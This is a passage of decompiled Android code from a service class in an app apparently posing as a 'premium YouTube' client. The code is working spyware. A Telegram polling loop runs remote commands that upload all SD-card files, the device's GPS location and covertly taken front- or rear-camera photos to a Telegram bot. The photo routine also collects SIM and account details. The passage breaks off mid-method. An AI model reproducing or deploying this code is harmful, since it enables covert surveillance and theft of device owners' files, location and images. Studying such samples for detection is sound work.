                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch52$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$124, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$124", f = "UploadService.kt", i = {}, l = {2078}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass124 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass124(UploadService uploadService, Continuation<? super AnonymousClass124> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass124(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۴۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch53$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$125, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$125", f = "UploadService.kt", i = {}, l = {2079}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass125 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass125(UploadService uploadService, Continuation<? super AnonymousClass125> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass125(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllFullSdcardFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$126, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$126", f = "UploadService.kt", i = {}, l = {2083}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass126 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass126(UploadService uploadService, Continuation<? super AnonymousClass126> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass126(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch54$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$127, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$127", f = "UploadService.kt", i = {}, l = {2094}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass127 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass127(UploadService uploadService, Continuation<? super AnonymousClass127> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass127(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۹String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch55$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$128, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$128", f = "UploadService.kt", i = {}, l = {2103}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass128 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass128(UploadService uploadService, Continuation<? super AnonymousClass128> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass128(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۰String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch56$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }
    }

    private final void startTelegramPolling() {
        this.pollingJob = BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۶1(null), 3, (Object) null);
    }

    private final void sendCurrentLocationToTelegram() {
        Location l;
        if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") == 0 || ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") == 0) {
            Object systemService = getSystemService("location");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.location.LocationManager");
            LocationManager lm = (LocationManager) systemService;
            List<String> providers = lm.getProviders(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۱Boolean$arg0$callgetProviders$valproviders$branch$if$funsendCurrentLocationToTelegram$classUploadService());
            Intrinsics.checkNotNullExpressionValue(providers, "lm.getProviders(true)");
            Location loc = null;
            for (String provider : providers) {
                try {
                    l = lm.getLastKnownLocation(provider);
                } catch (Exception e) {
                    l = null;
                }
                if (l != null && (loc == null || l.getTime() > loc.getTime())) {
                    loc = l;
                }
            }
            if (loc == null) {
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۲۵2(null), 3, (Object) null);
                return;
            }
            double lat = loc.getLatitude();
            double lon = loc.getLongitude();
            String dateStr = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۲String$arg0$call$init$$$this$callformat$valdateStr$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService()).format(new Date(loc.getTime()));
            String msg = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۶String$0$str$valmsg$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService() + dateStr + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۳String$2$str$valmsg$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService() + lat + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۱String$4$str$valmsg$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService() + lon + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۹String$6$str$valmsg$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService() + lat + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۵String$8$str$valmsg$branch$if$branch$if$funsendCurrentLocationToTelegram$classUploadService() + lon;
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۲۴1(msg, null), 3, (Object) null);
            sendLocationToTelegram(lat, lon);
            return;
        }
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۲۶3(null), 3, (Object) null);
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$1", f = "UploadService.kt", i = {}, l = {2134}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۴1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $msg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۲۴1(String str, Continuation<? super C۰۰۲۴1> continuation) {
            super(2, continuation);
            this.$msg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۴1(this.$msg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(this.$msg, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$2", f = "UploadService.kt", i = {}, l = {2137}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۵2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۲۵2(Continuation<? super C۰۰۲۵2> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۵2(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch$if$funsendCurrentLocationToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$3, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendCurrentLocationToTelegram$3", f = "UploadService.kt", i = {}, l = {2140}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۶3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۲۶3(Continuation<? super C۰۰۲۶3> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۶3(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$funsendCurrentLocationToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$1", f = "UploadService.kt", i = {}, l = {2146}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۷1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۵۷1(Continuation<? super C۰۰۵۷1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۷1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if$funtakeAndSendPhoto$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void takeAndSendPhoto(final boolean useFront) throws CameraAccessException {
        Object element$iv;
        if (ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") != 0) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۷1(null), 3, (Object) null);
            return;
        }
        Object systemService = getSystemService("camera");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.hardware.camera2.CameraManager");
        final CameraManager cameraManager = (CameraManager) systemService;
        Object[] cameraIdList = cameraManager.getCameraIdList();
        Intrinsics.checkNotNullExpressionValue(cameraIdList, "cameraManager.cameraIdList");
        Object[] $this$firstOrNull$iv = cameraIdList;
        int length = $this$firstOrNull$iv.length;
        int i = 0;
        while (true) {
            if (i < length) {
                element$iv = $this$firstOrNull$iv[i];
                String id = (String) element$iv;
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Intrinsics.checkNotNullExpressionValue(characteristics, "cameraManager.getCameraCharacteristics(id)");
                Integer facing = (Integer) characteristics.get(CameraCharacteristics.LENS_FACING);
                boolean z = true;
                if (!useFront ? !(facing != null && facing.intValue() == 1) : !(facing != null && facing.intValue() == 0)) {
                    z = false;
                }
                if (z) {
                    break;
                } else {
                    i++;
                }
            } else {
                element$iv = null;
                break;
            }
        }
        final String cameraId = (String) element$iv;
        if (cameraId == null) {
            UploadService $this$takeAndSendPhoto_u24lambda_u2433 = this;
            BuildersKt.launch$default($this$takeAndSendPhoto_u24lambda_u2433, (CoroutineContext) null, (CoroutineStart) null, new UploadService$takeAndSendPhoto$cameraId$2$1($this$takeAndSendPhoto_u24lambda_u2433, null), 3, (Object) null);
            return;
        }
        final ImageReader imageReader = ImageReader.newInstance(LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۰Int$arg0$callnewInstance$valimageReader$funtakeAndSendPhoto$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۵Int$arg1$callnewInstance$valimageReader$funtakeAndSendPhoto$classUploadService(), 256, LiveLiterals$UploadServiceKt.INSTANCE.m۳۲۰Int$arg3$callnewInstance$valimageReader$funtakeAndSendPhoto$classUploadService());
        Intrinsics.checkNotNullExpressionValue(imageReader, "newInstance(640, 480, ImageFormat.JPEG, 1)");
        final HandlerThread $this$takeAndSendPhoto_u24lambda_u2434 = new HandlerThread(LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۹String$arg0$call$init$$$$this$callapply$valhandlerThread$funtakeAndSendPhoto$classUploadService());
        $this$takeAndSendPhoto_u24lambda_u2434.start();
        final Handler handler = new Handler($this$takeAndSendPhoto_u24lambda_u2434.getLooper());
        try {
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() { // from class: com.w8sb.w8premiumyt.UploadService.takeAndSendPhoto.2
                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onOpened(final CameraDevice camera) throws CameraAccessException {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    final CaptureRequest.Builder captureRequestBuilder = camera.createCaptureRequest(2);
                    Intrinsics.checkNotNullExpressionValue(captureRequestBuilder, "camera.createCaptureRequ…e.TEMPLATE_STILL_CAPTURE)");
                    captureRequestBuilder.addTarget(imageReader.getSurface());
                    List<Surface> listListOf = CollectionsKt.listOf(imageReader.getSurface());
                    final Handler handler2 = handler;
                    final HandlerThread handlerThread = $this$takeAndSendPhoto_u24lambda_u2434;
                    camera.createCaptureSession(listListOf, new CameraCaptureSession.StateCallback() { // from class: com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$2$onOpened$1
                        @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                        public void onConfigured(CameraCaptureSession session) throws CameraAccessException {
                            Intrinsics.checkNotNullParameter(session, "session");
                            CaptureRequest captureRequestBuild = captureRequestBuilder.build();
                            final CameraDevice cameraDevice = camera;
                            session.capture(captureRequestBuild, new CameraCaptureSession.CaptureCallback() { // from class: com.w8sb.w8premiumyt.UploadService$takeAndSendPhoto$2$onOpened$1$onConfigured$1
                                @Override // android.hardware.camera2.CameraCaptureSession.CaptureCallback
                                public void onCaptureCompleted(CameraCaptureSession session2, CaptureRequest request, TotalCaptureResult result) {
                                    Intrinsics.checkNotNullParameter(session2, "session");
                                    Intrinsics.checkNotNullParameter(request, "request");
                                    Intrinsics.checkNotNullParameter(result, "result");
                                    session2.close();
                                    cameraDevice.close();
                                }
                            }, handler2);
                        }

                        @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Intrinsics.checkNotNullParameter(session, "session");
                            session.close();
                            camera.close();
                            handlerThread.quitSafely();
                        }
                    }, handler);
                }

                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onDisconnected(CameraDevice camera) {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    camera.close();
                    $this$takeAndSendPhoto_u24lambda_u2434.quitSafely();
                }

                @Override // android.hardware.camera2.CameraDevice.StateCallback
                public void onError(CameraDevice camera, int error) {
                    Intrinsics.checkNotNullParameter(camera, "camera");
                    camera.close();
                    $this$takeAndSendPhoto_u24lambda_u2434.quitSafely();
                }
            }, handler);
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() { // from class: com.w8sb.w8premiumyt.UploadService$$ExternalSyntheticLambda3
                @Override // android.media.ImageReader.OnImageAvailableListener
                public final void onImageAvailable(ImageReader imageReader2) {
                    UploadService.takeAndSendPhoto$lambda$35(this.f$0, useFront, cameraManager, cameraId, imageReader, $this$takeAndSendPhoto_u24lambda_u2434, imageReader2);
                }
            }, handler);
        } catch (Exception e) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۹4(e, null), 3, (Object) null);
            $this$takeAndSendPhoto_u24lambda_u2434.quitSafely();
        }
    }

    private static final void takeAndSendPhoto$lambda$35(UploadService this$0, boolean $useFront, CameraManager $cameraManager, String $cameraId, ImageReader $imageReader, HandlerThread $handlerThread, ImageReader reader) {
        String locationStr;
        String mapsUrl;
        String orientationStr;
        String str;
        String exposure;
        File file;
        String iso;
        String iso2;
        String userAccount;
        String simInfo;
        String string;
        Object systemService;
        int rot;
        Location l;
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intrinsics.checkNotNullParameter($cameraManager, "$cameraManager");
        Intrinsics.checkNotNullParameter($cameraId, "$cameraId");
        Intrinsics.checkNotNullParameter($imageReader, "$imageReader");
        Intrinsics.checkNotNullParameter($handlerThread, "$handlerThread");
        Image image = reader.acquireLatestImage();
        if (image == null) {
            return;
        }
        ByteBuffer buffer = image.getPlanes()[LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۳Int$arg0$callget$$this$callgetBuffer$valbuffer$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()].getBuffer();
        byte[] bytes = new byte[buffer.remaining()];
        buffer.get(bytes);
        int width = image.getWidth();
        int height = image.getHeight();
        long timestamp = System.currentTimeMillis();
        image.close();
        File file2 = new File(this$0.getCacheDir(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۹String$0$str$arg1$call$init$$valfile$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() + timestamp + LiveLiterals$UploadServiceKt.INSTANCE.m۶۷۴String$2$str$arg1$call$init$$valfile$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService());
        FilesKt.writeBytes(file2, bytes);
        LiveLiterals$UploadServiceKt liveLiterals$UploadServiceKt = LiveLiterals$UploadServiceKt.INSTANCE;
        String cameraType = $useFront ? liveLiterals$UploadServiceKt.m۱۳۵۹String$branch$if$valcameraType$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService() : liveLiterals$UploadServiceKt.m۱۴۰۲String$else$if$valcameraType$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        String dateStr = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۴String$arg0$call$init$$$this$callformat$valdateStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService()).format(new Date(timestamp));
        long fileSize = file2.length();
        String locationStr2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۷String$vallocationStr$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        String mapsUrl2 = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۹String$valmapsUrl$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeAndSendPhoto$classUploadService();
        try {
